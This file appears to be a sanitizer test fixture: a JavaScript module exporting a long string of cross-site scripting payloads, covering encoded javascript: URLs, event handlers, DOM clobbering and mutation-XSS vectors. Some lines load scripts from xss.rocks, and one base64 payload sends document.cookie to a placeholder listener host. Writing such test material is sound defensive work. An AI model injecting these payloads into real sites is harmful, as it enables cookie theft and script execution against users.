export const xssMock = `

<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>

<IMG SRC="javascript:alert('XSS');">

<IMG SRC=javascript:alert('XSS')>

<IMG SRC=JaVaScRiPt:alert('XSS')>

<IMG SRC=javascript:alert(&quot;XSS&quot;)>

<IMG SRC=\`javascript:alert("RSnake says, 'XSS'")\`>

\\<a onmouseover="alert(document.cookie)"\\>xxs link\\</a\\>

\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>

<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>

<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>

<IMG SRC=# onmouseover="alert('xxs')">

<IMG SRC= onmouseover="alert('xxs')">

<IMG onmouseover="alert('xxs')">

<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>

<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>

<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>

<IMG SRC="jav	ascript:alert('XSS');">

<IMG SRC="jav&#x09;ascript:alert('XSS');">

<IMG SRC="jav&#x0A;ascript:alert('XSS');">

<IMG SRC="jav&#x0D;ascript:alert('XSS');">

perl -e 'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";' > out

<IMG SRC=" &#14;  javascript:alert('XSS');">

<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>

<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^\`=alert("XSS")>

<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>

<<SCRIPT>alert("XSS");//\\<</SCRIPT>

<SCRIPT SRC=http://xss.rocks/xss.js?< B >

<SCRIPT SRC=//xss.rocks/.j>

<IMG SRC="\`<javascript:alert>\`('XSS')"

<iframe src=http://xss.rocks/scriptlet.html <

\\";alert('XSS');//

</script><script>alert('XSS');</script>

</TITLE><SCRIPT>alert("XSS");</SCRIPT>

<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">

<BODY BACKGROUND="javascript:alert('XSS')">

<IMG DYNSRC="javascript:alert('XSS')">

<IMG LOWSRC="javascript:alert('XSS')">

<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>

<IMG SRC='vbscript:msgbox("XSS")'>

<IMG SRC="livescript:[code]">

<svg/onload=alert('XSS')>

Set.constructor\`alert\\x28document.domain\\x29\`\`\`

<BODY ONLOAD=alert('XSS')>

<BGSOUND SRC="javascript:alert('XSS');">

<BR SIZE="&{alert('XSS')}">

<LINK REL="stylesheet" HREF="javascript:alert('XSS');">

<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">

<STYLE>@import'http://xss.rocks/xss.css';</STYLE>

<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">

<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>

<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>

<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">

exp/*<A STYLE='no\\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>

<STYLE TYPE="text/javascript">alert('XSS');</STYLE>

<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>

<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>

<XSS STYLE="xss:expression(alert('XSS'))">

<XSS STYLE="behavior: url(xss.htc);">

¼script¾alert(¢XSS¢)¼/script¾

<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">

<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">

<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">

<IFRAME SRC="javascript:alert('XSS');"></IFRAME>

<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>

<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>

<TABLE BACKGROUND="javascript:alert('XSS')">

<TABLE><TD BACKGROUND="javascript:alert('XSS')">

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

<DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">

<DIV STYLE="background-image: url(javascript:alert('XSS'))">

<DIV STYLE="width: expression(alert('XSS'));">

<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->

<BASE HREF="javascript:alert('XSS');//">

<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>

<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>

<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>

a="get";
b="URL(\\"";
c="javascript:";
d="alert('XSS');\\")";
eval(a+b+c+d);

<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>

<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>

<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>

<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->

<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>

<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">

Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser

<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">

<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-

<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>

<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>

<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>

<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>

<SCRIPT a=\`>\` SRC="httx://xss.rocks/xss.js"></SCRIPT>

<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>

<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>

<A HREF="http://66.102.7.147/">XSS</A>

<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>

<A HREF="http://1113982867/">XSS</A>

<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>

<A HREF="http://0102.0146.0007.00000223/">XSS</A>

<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">

<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>

<A HREF="//www.google.com/">XSS</A>

<A HREF="//google">XSS</A>

<A HREF="http://ha.ckers.org@google">XSS</A>

<A HREF="http://google:ha.ckers.org">XSS</A>

<A HREF="http://google.com/">XSS</A>

<A HREF="http://www.google.com./">XSS</A>

<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>

<A HREF="http://www.google.com/ogle.com/">XSS</A>

Example: <script> ... setTimeout(\\\\"writetitle()\\\\",$\\_GET\\[xss\\]) ... </script>
Exploitation: /?xss=500); alert(document.cookie);//

Example: <script> ... eval($\\_GET\\[xss\\]); ... </script>
Exploitation: /?xss=document.cookie

...
header('Location: '.$_GET['param']);
...

...
header('Refresh: 0; URL='.$_GET['param']);
...

/?param=<javascript:alert(document.cookie>)

/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=

<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<Video> <source onerror = "javascript: alert (XSS)">
<Input value = "XSS" type = text>
<applet code="javascript:confirm(document.cookie);">
<isindex x="javascript:" onmouseover="alert(XSS)">
"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
"><img src="x:x" onerror="alert(XSS)">
"><iframe src="javascript:alert(XSS)">
<object data="javascript:alert(XSS)">
<isindex type=image src=1 onerror=alert(XSS)>
<img src=x:alert(alt) onerror=eval(src) alt=0>
<img  src="x:gif" onerror="window['al\\u0065rt'](0)"></img>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\\u0061lert(1)">X
</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
<style>//*{x:expression(alert(/xss/))}//<style></style>
On Mouse Over​
<img src="/" =_=" title="onerror='prompt(1)'">
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe
<script x> alert(1) </script 1=2
<form><button formaction=javascript&colon;alert(1)>CLICKME
<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>

(alert)(1)
a=alert,a(1)
[1].find(alert)
top[“al”+”ert”](1)
top[/al/.source+/ert/.source](1)
al\\u0065rt(1)
top[‘al\\145rt’](1)
top[‘al\\x65rt’](1)
top[8680439..toString(30)](1)


-------------------------------


<!-- I am ready now, click one of the buttons! -->
<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>

<svg><image id="v-146" width="500" height="500" xmlns:xlink="http://www.w3.org/1999/xlink" href="data:image/svg+xml;utf8,%3Csvg%20viewBox%3D%220%200%20100%20100%22%20height%3D%22100%22%20width%3D%22100%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20data-name%3D%22Layer%201%22%20id%3D%22Layer_1%22%3E%0A%20%20%3Ctitle%3ECompute%3C%2Ftitle%3E%0A%20%20%3Cg%3E%0A%20%20%20%20%3Crect%20fill%3D%22%239d5025%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2224.74%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%20%20%3Crect%20fill%3D%22%23f58536%22%20ry%3D%229.12%22%20rx%3D%229.12%22%20height%3D%2253%22%20width%3D%2253%22%20y%3D%2222.26%22%20x%3D%2223.5%22%3E%3C%2Frect%3E%0A%20%20%3C%2Fg%3E%0A%3C%2Fsvg%3E" preserveratio="true" style="border-color: rgb(51, 51, 51); box-sizing: border-box; color: rgb(51, 51, 51); cursor: move; font-family: sans-serif; font-size: 14px; line-height: 20px; outline-color: rgb(51, 51, 51); text-size-adjust: 100%; column-rule-color: rgb(51, 51, 51); -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: rgba(0, 0, 0, 0); -webkit-text-emphasis-color: rgb(51, 51, 51); -webkit-text-fill-color: rgb(51, 51, 51); -webkit-text-stroke-color: rgb(51, 51, 51); user-select: none; vector-effect: non-scaling-stroke;"></image></svg>

<div aria-labelledby="msg--title" role="dialog" class="msg"><button class="modal-close" aria-label="close" type="button"><i class="icon-close"></i>some button</button></div>

<input type=checkbox checked><input type=checkbox onclick>

<svg><defs><filter id="f1"><feGaussianBlur in="SourceGraphic" stdDeviation="15" /></filter></defs><rect width="90" height="90" stroke="green" stroke-width="3" fill="yellow" filter="url(#f1)" /></svg>

<b href="javascript:alert(1)" title="javascript:alert(2)"></b>

<img src="data:,123"><audio src="data:,456"></audio><video src="data:,789"></video><source src="data:,012"><div src="data:,345">

<img src=x name=createElement><img src=y id=createElement>

<img src=x name=cookie>

123<a href='javascript:alert(1)'>I am a dolphin!</a>

123<a href='javascript:alert(1)'>I am a dolphin too!</a>

123<a href=' javascript:alert(1)'>CLICK</a><a href='&#xA0javascript:alert(1)'>CLICK</a><a href='&#x1680;javascript:alert(1)'>CLICK</a><a href='&#x180E;javascript:alert(1)'>CLICK</a><a href='&#x2000;javascript:alert(1)'>CLICK</a><a href='&#x2001;javascript:alert(1)'>CLICK</a><a href='&#x2002;javascript:alert(1)'>CLICK</a><a href='&#x2003;javascript:alert(1)'>CLICK</a><a href='&#x2004;javascript:alert(1)'>CLICK</a><a href='&#x2005;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2006;javascript:alert(1)'>CLICK</a><a href='&#x2007;javascript:alert(1)'>CLICK</a><a href='&#x2008;javascript:alert(1)'>CLICK</a><a href='&#x2009;javascript:alert(1)'>CLICK</a><a href='&#x200A;javascript:alert(1)'>CLICK</a><a href='&#x200B;javascript:alert(1)'>CLICK</a><a href='&#x205f;javascript:alert(1)'>CLICK</a><a href='&#x3000;javascript:alert(1)'>CLICK</a>

<img src=data:image/jpeg,ab798ewqxbaudbuoibeqbla>

<img src="
data:image/jpeg,ab798ewqxbaudbuoibeqbla">

<img src='javascript:while(1){}'>

<a href=data:,evilnastystuff>clickme</a>

123456

<form onmouseover='alert(1)'><input name="attributes"><input name="attributes">

<img src=x name=getElementById>

<a href="#some-code-here" id="location">invisible

<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>

<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeName>123</form>

<form onsubmit=alert(1)><input onfocus=alert(2) name=nodeType>123</form>

<form onsubmit=alert(1)><input onfocus=alert(2) name=children>123</form>

<form onsubmit=alert(1)><input onfocus=alert(2) name=attributes>123</form>

<form onsubmit=alert(1)><input onfocus=alert(2) name=removeChild>123</form>

<form onsubmit=alert(1)><input onfocus=alert(2) name=removeAttributeNode>123</form>

<form onsubmit=alert(1)><input onfocus=alert(2) name=setAttribute>123</form>

<style>*{color: red}</style>

<p>hello</p>

<listing>&lt;img onerror="alert(1);//" src=x&gt;<t t></listing>

<img src=x id/=' onerror=alert(1)//'>

<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->

<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>

<b><noscript><a alt="</noscript><img src=x onerror=alert(1)>"></noscript>

<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>

<a href="javascript:alert(1)">@shafigullin<a>

<option><style></option></select><b><img src=x onerror=alert(1)></style></option>

<option><iframe></select><b><script>alert(1)</script>

</iframe></option>

<b><style><style/><img src=x onerror=alert(1)>

<b><style><style////><img src=x onerror=alert(1)></style>

<math xmlns="http://www.w3.org/1998/Math/MathML" display="block">
  <mrow>
    <menclose notation="box"><mi>a</mi></menclose><mo>,</mo>
    <menclose notation="box"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
    <menclose notation="box" mathcolor="#FF0000"><mi>a</mi></menclose><mo>,</mo>
    <menclose notation="box" mathbackground="#80FF80"><mi mathcolor="#FF0000">a</mi></menclose><mo>,</mo>
    <menclose notation="box" mathcolor="#FF0000" mathbackground="#80FF80"><mi>a</mi></menclose><mo>,</mo>
    <menclose notation="box"><mi mathbackground="#80FF80">a</mi></menclose>
  </mrow>
</math>

<image name=body><image name=adoptNode>@mmrupp<image name=firstElementChild><svg onload=alert(1)>

<a href="javascript:alert(1)">@shafigullin<a>

<image name=activeElement><svg onload=alert(1)>

<image name=body><img src=x><svg onload=alert(1); autofocus>, <keygen onfocus=alert(1); autofocus>

<div onmouseout="javascript:alert(/superevr/)" x=yscript: n>@superevr</div>

<button remove=me onmousedown="javascript:alert(1);" onclick="javascript:alert(1)" >@giutro

<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>

<isindex x="javascript:" onmouseover="alert(1)" label="variation of bypass by @giutro">

<div wow=removeme onmouseover=alert(1)>text

<input x=javascript: autofocus onfocus=alert(1)><svg id=1 onload=alert(1)></svg>

<isindex src="javascript:" onmouseover="alert(1)" label="bypass by @giutro" />

<a href="javascript:123" onclick="alert(1)">CLICK ME (bypass by @shafigullin)</a>

<form action="javasc
ript:alert(1)"><button>XXX</button></form>

<div id="1"><form id="foobar"></form><button form="foobar" formaction="javascript:alert(1)">X</button>//["'\`-->]]>]</div>

<div id="2"><meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//["'\`-->]]>]</div>

<div id="3"><meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//["'\`-->]]>]</div>

<div id="4">0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//["'\`-->]]>]</div>

<div id="5"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//["'\`-->]]>]</div>

<div id="6"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//["'\`-->]]>]</div>

<div id="7"><input onfocus=alert(7) autofocus>//["'\`-->]]>]</div>

<div id="8"><input onblur=alert(8) autofocus><input autofocus>//["'\`-->]]>]</div>

<div id="9"><a style="-o-link:'javascript:alert(9)';-o-link-source:current">X</a>//["'\`-->]]>]</div>

<div id="10"><video poster=javascript:alert(10)//></video>//["'\`-->]]>]</div>

<div id="11"><svg xmlns="http://www.w3.org/2000/svg"><g onload="javascript:alert(11)"></g></svg>//["'\`-->]]>]</div>

<div id="12"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//["'\`-->]]>]</div>

<div id="13"><x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>//["'\`-->]]>]</div>

<div id="14"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//["'\`-->]]>]</div>

<div id="15"><script>({0:#0=alert/#0#/#0#(0)})</script>//["'\`-->]]>]</div>

<div id="16">X<x style=\`behavior:url(#default#time2)\` onbegin=\`alert(16)\` >//["'\`-->]]>]</div>

<div id="17"><?xml-stylesheet href="javascript:alert(17)"?><root/>//["'\`-->]]>]</div>

<div id="18"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>//["'\`-->]]>]</div>

<div id="19"><meta charset="x-mac-farsi">¼script ¾alert(19)//¼/script ¾//["'\`-->]]>]</div>

<div id="20"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//["'\`-->]]>]</div>

<div id="21"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//["'\`-->]]>]</div>

<div id="22"><input onblur=focus() autofocus><input>//["'\`-->]]>]</div>

<div id="23"><form id=foobar onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//["'\`-->]]>]</div>

<div id="24">1<set/xmlns=\`urn:schemas-microsoft-com:time\` style=\`behAvior:url(#default#time2)\` attributename=\`innerhtml\` to=\`<img/src="x"onerror=alert(24)>\`>//["'\`-->]]>]</div>

<div id="25"><script src="#">{alert(25)}</script>;1//["'\`-->]]>]</div>

<div id="26">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//["'\`-->]]>]</div>

<div id="27"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//["'\`-->]]>]</div><div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=<img/src="."onerror=alert(28)>>//["'\`-->]]>]</div>

<div id="29"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//["'\`-->]]>]</div>

<div id="30"><style>@import "data:,*%7bx:expression(alert(30))%7D";</style>//["'\`-->]]>]</div>

<div id="31"><frameset onload=alert(31)>//["'\`-->]]>]</div>

<div id="32"><table background="javascript:alert(32)"></table>//["'\`-->]]>]</div>

<div id="33"><a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(33);">XXX</a></a><a href="javascript:alert(2)">XXX</a>//["'\`-->]]>]</div>

<div id="34">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//["'\`-->]]>]</div>

<div id="35">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//["'\`-->]]>]</div>

<div id="36"><a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(36)">XXX</a>//["'\`-->]]>]</div>

<div id="37"><!--<img src="--><img src=x onerror=alert(37)//">//["'\`-->]]>]</div>

<div id="38"><comment><img src="</comment><img src=x onerror=alert(38)//">//["'\`-->]]>]</div><div id="39"><!-- up to Opera 11.52, FF 3.6.28 -->

<![><img src="]><img src=x onerror=alert(39)//">

<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->
<svg><![CDATA[><image xlink:href="]]><img src=x onerror=alert(2)//"></svg>//["'\`-->]]>]</div>

<div id="40"><style><img src="</style><img src=x onerror=alert(40)//">//["'\`-->]]>]</div>

<div id="41"><li style=list-style:url() onerror=alert(41)></li>

<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'\`-->]]>]</div>

<div id="42"><head><base href="javascript://"/></head><body><a href="/. /,alert(42)//#">XXX</a></body>//["'\`-->]]>]</div>

<div id="43"><?xml version="1.0" standalone="no"?>

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<style type="text/css">
@font-face {font-family: y; src: url("font.svg#x") format("svg");} body {font: 100px "y";}
</style>
</head>
<body>Hello</body>
</html>//["'\`-->]]>]</div>

<div id="44"><style>*[{}@import'test.css?]{color: green;}</style>X//["'\`-->]]>]</div>

<div id="45"><div style="font-family:'foo[a];color:red;';">XXX</div>//["'\`-->]]>]</div>

<div id="46"><div style="font-family:foo}color=red;">XXX</div>//["'\`-->]]>]</div>

<div id="47"><svg xmlns="http://www.w3.org/2000/svg"><script>alert(47)</script></svg>//["'\`-->]]>]</div>

<div id="48"><SCRIPT FOR=document EVENT=onreadystatechange>alert(48)</SCRIPT>//["'\`-->]]>]</div>

<div id="49"><OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(49)"></OBJECT>//["'\`-->]]>]</div>

<div id="50"><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>//["'\`-->]]>]</div>

<div id="51"><embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>//["'\`-->]]>]</div>

<div id="52"><x style="behavior:url(test.sct)">//["'\`-->]]>]</div><div id="53"><xml id="xss" src="test.htc"></xml>

<label dataformatas="html" datasrc="#xss" datafld="payload"></label>//["'\`-->]]>]</div>

<div id="54"><script>[{'a':Object.prototype.__defineSetter__('b',function(){alert(arguments[0])}),'b':['secret']}]</script>//["'\`-->]]>]</div>

<div id="55"><video><source onerror="alert(55)">//["'\`-->]]>]</div>

<div id="56"><video onerror="alert(56)"><source></source></video>//["'\`-->]]>]</div>

<div id="57"><b <script>alert(57)//</script>0</script></b>//["'\`-->]]>]</div>

<div id="58"><b><script<b></b><alert(58)</script </b></b>//["'\`-->]]>]</div>

<div id="59"><div id="div1"><input value="\`\`onmouseover=alert(59)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>//["'\`-->]]>]</div>

<div id="60"><div style="[a]color[b]:[c]red">XXX</div>//["'\`-->]]>]</div>

<div id="62"><!-- IE 6-8 -->
<x '="foo"><x foo='><img src=x onerror=alert(62)//'>
<!-- IE 6-9 -->
<! '="foo"><x foo='><img src=x onerror=alert(2)//'>
<? '="foo"><x foo='><img src=x onerror=alert(3)//'>//["'\`-->]]>]</div>

<div id="63"><embed src="javascript:alert(63)"></embed> // O10.10↓, OM10.0↓, GC6↓, FF
<img src="javascript:alert(2)">
<image src="javascript:alert(2)"> // IE6, O10.10↓, OM10.0↓
<script src="javascript:alert(3)"></script> // IE6, O11.01↓, OM10.1↓//["'\`-->]]>]</div>

<div id="64"><!DOCTYPE x[<!ENTITY x SYSTEM "http://html5sec.org/test.xxe">]><y>&x;</y>//["'\`-->]]>]</div>

<div id="65"><svg onload="javascript:alert(65)" xmlns="http://www.w3.org/2000/svg"></svg>//["'\`-->]]>]</div><div id="66"><?xml version="1.0"?>

<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform' id='xss'%3E%3Cxsl:output method='html'/%3E%3Cxsl:template match='/'%3E%3Cscript%3Ealert(66)%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>
<root/>//["'\`-->]]>]</div>
<div id="67"><!DOCTYPE x [
    <!ATTLIST img xmlns CDATA "http://www.w3.org/1999/xhtml" src CDATA "xx"
 onerror CDATA "alert(67)"
 onload CDATA "alert(2)">
]><img />//["'\`-->]]>]</div>

<div id="68"><doc xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:html="http://www.w3.org/1999/xhtml">
    <html:style /><x xlink:href="javascript:alert(68)" xlink:type="simple">XXX</x>
</doc>//["'\`-->]]>]</div>

